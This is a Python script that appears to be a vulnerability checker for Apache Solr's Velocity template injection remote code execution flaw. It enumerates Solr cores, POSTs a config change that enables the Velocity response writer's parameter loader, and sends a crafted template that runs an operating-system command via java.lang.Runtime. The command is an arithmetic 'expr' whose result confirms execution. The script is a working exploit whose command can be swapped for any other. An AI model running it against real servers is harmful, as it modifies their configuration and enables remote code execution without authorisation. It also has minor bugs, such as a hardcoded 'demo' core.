import requests,re,urllib3
from urllib import parse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
rand1=randomInt(200000000, 210000000)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
rand2=randomInt(200000000, 210000000)
def urlencode(string):
    return parse.quote(string)
payload=urlencode("expr " + str(rand1) + " + " + str(rand2))
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"solr/admin/cores?indexInfo=false&wt=json"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "responseHeader" in response.text and "instanceDir" in response.text:
		r1=True
		core=re.findall("\"name\":\"(.+?)\",",response.text)[0]
	else:
		r1=False
	url=baseurl+f"solr/{core}/config"
	body='''{\n
  "update-queryresponsewriter": {\n
    "startup": "lazy",\n
    "name": "velocity",\n
    "class": "solr.VelocityResponseWriter",\n
    "template.base.dir": "",\n
    "solr.resource.loader.enabled": "true",\n
    "params.resource.loader.enabled": "true"\n
   }\n
}'''
	headers={'Content-Type': 'application/json'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "responseHeader" in response.text and "\"status\":0" in response.text:
		r2=True
	else:
		r2=False
	url=baseurl+"solr/demo/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27"+payload+"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and str(rand1 + rand2) in response.text:
		r3=True
	else:
		r3=False
	if r1 and r2 and r3:
		return True
	else:
		return False
